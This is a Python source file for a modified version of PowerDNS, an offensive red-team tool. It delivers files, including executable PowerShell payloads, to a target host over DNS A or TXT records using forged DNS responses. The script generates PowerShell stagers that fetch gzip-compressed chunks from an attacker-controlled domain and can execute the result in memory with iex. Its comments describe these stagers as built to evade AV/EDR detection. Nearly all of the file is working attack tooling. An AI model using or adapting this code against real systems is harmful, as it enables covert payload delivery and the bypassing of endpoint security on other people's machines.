#! /usr/bin/env python3

# This is a modified version of PowerDNS by Matthew David (@icyguider)
# List of updates made:
#   - Support for transfer over DNS A records
#   - Gzip compression to reduce file transfer size
#   - Support for transferring all types of files
#   - New stagers that can be easily obfuscated or ran line-by-line to evade being blocked by AV/EDR
#   - Options to print, exec, or save transferred file
#   - Update to python3 from python2

# Comments/credit for the original tool can be found below:
# PowerDNS: A tool for performing Powershell DNS Delivery
# Author: Dominic Chell <dominic@mdsec.co.uk>
# MDSec ActiveBreach Team
#
# Some improvements made with <3 by @byt3bl33d3r

import sys
import os
import base64
import signal
import argparse
from argparse import RawTextHelpFormatter
from scapy.all import *

banner = """
 ___                        ___  _ _  ___  
| . \ ___  _ _ _  ___  _ _ | . \| \ |/ __> 
|  _// . \| | | |/ ._>| '_>| | ||   |\__ \ 
|_|  \___/|__/_/ \___.|_|  |___/|_\_|<___/ 

DNS A Record & updated stager version by @icyguider
        Original version by @domchell

"""

client = """
$cn = REPLACE_CHUNK_NUMBER;
$ok = "A" * 16;

$final = @() -as [byte[]];

for ($i=0;$i -le $cn;$i++) {
    $s = '.';
    Write-Host "Chunk $i/$cn";
    [byte[]] $bytes = (Resolve-DnsName -ty A $i$s$ok'.REPLACE_DOMAIN' | select -exp IPAddress).split('.');
    $final = @($final + $bytes) -as [byte[]];
};
$a=New-Object IO.MemoryStream(,$final);
$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress);
$output = New-Object System.IO.MemoryStream;
$decompressed.CopyTo($output);
[byte[]] $byteOutArray = $output.ToArray();
REPLACE_DATA_OPTION
"""

txtclient = """
$cn = REPLACE_CHUNK_NUMBER;
$b64 = "";

for ($i=1;$i -le $cn;$i++){
    Write-Host "Chunk $i/$cn";
    $b64 += Resolve-DnsName -ty TXT $i'.REPLACE_DOMAIN' | select -exp Strings;
};
$final = [System.Convert]::FromBase64String($b64);
$a=New-Object IO.MemoryStream(,$final);
$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CompressionMode]::Decompress);
$output = New-Object System.IO.MemoryStream;
$decompressed.CopyTo($output);
[byte[]] $byteOutArray = $output.ToArray();
REPLACE_DATA_OPTION
"""

def validate_args():

    print(banner)

    parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter)
    parser.add_argument("-f", "--file", metavar="<file>", dest="file", default=None, help="File to transfer")
    parser.add_argument("-d", "--domain", metavar="<domain>", dest="domain", default=None, help="domain with auth NS record")
    parser.add_argument("-a", "--action", metavar="<action>", dest="action", default="save", help="action to perform once data is transferred (options: save, exec, print)")
    parser.add_argument("-r", "--record-type", metavar="<record-type>", dest="record_type", default=5, help='type of DNS record to use for transfer (options: A, TXT) (default: TXT)')
    parser.add_argument("-i", "--interface", metavar="<interface>", dest="interface", default="eth0", help="interface to bind to (default: eth0)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("\n\033[1;34m[*]\033[0;0m PowerDNS: Script needs to be run with root privileges")
        sys.exit(-1)

    elif not args.file or not args.domain:
        parser.print_help()
        print("\n\033[1;34m[*]\033[0;0m PowerDNS: The --file and --domain arguments are required")
        sys.exit(-1)

    elif args.file:
        if not os.path.exists(os.path.expanduser(args.file)):
            print("\n\033[1;34m[*]\033[0;0m PowerDNS: Specified path to file is invalid")
            sys.exit(-1)

    args.file = os.path.expanduser(args.file)

    return args


def signal_handler(signal, frame):
        print('\033[1;34m[*] PowerDNS:\033[0;0m Exiting')
        sys.exit(0)


def base64_file(file):
    try:
        with open(file, "rb") as powershell_file:
            encoded_string = base64.b64encode(powershell_file.read())
        return encoded_string
    except:
        print("\033[1;34m[*] PowerDNS:\033[0;0m Error opening file")
        sys.exit(-1)


def get_chunks(file):
    tmp_chunks = []
    encoded_file = base64_file(file)
    for i in range(0, len(encoded_file), 250):
        tmp_chunks.append(encoded_file[i:i + 250])
    return tmp_chunks

def gen_list(file):
    f = open(file, 'rb')
    filedata = f.read()
    f.close()

    arrdata = []
    currentchunk = ""
    c2 = 0
    for i in range(0, len(filedata)):
        char = filedata[i]
        currentchunk += str(char) + "."
        c2 += 1
        if c2 == 4:
            arrdata.append(currentchunk[:-1])
            currentchunk = ""
            c2 = 0
    return arrdata


#original handler, used for TXT transfers
def powerdnsHandler(data):
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        global chunks
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        qname = str((dnsqr.qname).decode())

        print ('\033[1;34m[*] PowerDNS:\033[0;0m Received DNS Query for {} from {}'.format(qname, ip.src))

        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
            try:
                response = chunks[int(qname.split('.')[0])]
                if isinstance(response, str) != True:
                    response = response.decode()
                #print("RESPONSE: " + response)
            except Exception as e:
                print(e)
                return
            rdata = response
            rcode = 0
            dn = domain
            an = (None, DNSRR(rrname=dnsqr.qname, type='TXT', rdata=rdata, ttl=1))[rcode == 0]
            ns = DNSRR(rrname=dnsqr.qname, type="NS", ttl=1, rdata="ns1." + dn)
            forged = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
            send(forged, verbose=0, iface=interface)

#handler used for A record transfers
def ApowerdnsHandler(data):
    if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
        global chunks
        global bigdata
        counter = 0
        ip = data.getlayer(IP)
        udp = data.getlayer(UDP)
        dns = data.getlayer(DNS)
        dnsqr = data.getlayer(DNSQR)

        qname = str(dnsqr.qname.decode())

        print('\033[1;34m[*] PowerDNS:\033[0;0m Received DNS Query for {} from {}'.format(qname, ip.src))

        arrdata = bigdata

        if len(qname.split(".")[1]) == 16:

            index = int(qname.split(".")[0])
            rdata = arrdata[index]
            dn = domain
            rcode = 0
            an = (None, DNSRR(rrname=dnsqr.qname, type='A', rdata=rdata, ttl=1))[rcode == 0]
            ns = DNSRR(rrname=dnsqr.qname, type="NS", ttl=1, rdata="ns1." + dn)
            forged = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
            send(forged, verbose=0, iface=interface)
            counter += 1


if __name__ == '__main__':
    chunks = []
    args = validate_args()
    signal.signal(signal.SIGINT, signal_handler)
    recordType = args.record_type.lower()
    os.system("gzip -c " + args.file + " > compressed.gz")
    if recordType == "a":
        bigdata = gen_list("compressed.gz")
        client = client.replace("REPLACE_CHUNK_NUMBER", str(len(bigdata)-1))
        chunks = get_chunks("compressed.gz")
    elif recordType == "txt":
        client = txtclient
        chunks = get_chunks("compressed.gz")
        client = client.replace("REPLACE_CHUNK_NUMBER", str(len(chunks)))
    client = client.replace("REPLACE_DOMAIN", args.domain)
    os.system("rm compressed.gz")
    if args.action == "print":
        client = client.replace("REPLACE_DATA_OPTION", "$done = [System.Text.Encoding]::ASCII.GetString($byteOutArray);\necho $done;")
    elif args.action == "exec":
        client = client.replace("REPLACE_DATA_OPTION", "$done = [System.Text.Encoding]::ASCII.GetString($byteOutArray);\niex $done;")
    elif args.action == "save":
        client = client.replace("REPLACE_DATA_OPTION", "[System.IO.File]::WriteAllBytes('" + args.file + "', $byteOutArray);")
    else:
        print("Invalid action provided! Valid actions are: save, exec, print")
        sys.exit(-1)
    print("\033[1;34mType or paste this into powershell or powershell_ise on target host:\033[0;0m")
    print(client[1:])
    oneliner = client.replace("\n", "")
    oneliner = oneliner.replace("    ", " ")
    print("\033[1;34mOne Liner:\033[0;0m \n" + oneliner)
    print("\033[1;34m\nWaiting for requests...\033[0;0m")
    domain = args.domain
    interface = args.interface
    # Insert stager itself as first chunk. To quickly get stager via TXT record, request the first chunk like so: Resolve-DnsName -ty TXT 0.test.domain.com
    chunks.insert(0, oneliner)

    while True:
        if recordType == "txt":
            mSniff = sniff(filter="udp dst port 53", iface=interface, prn=powerdnsHandler)
        elif recordType == "a":
            mSniff = sniff(filter="udp dst port 53", iface=interface, prn=ApowerdnsHandler)
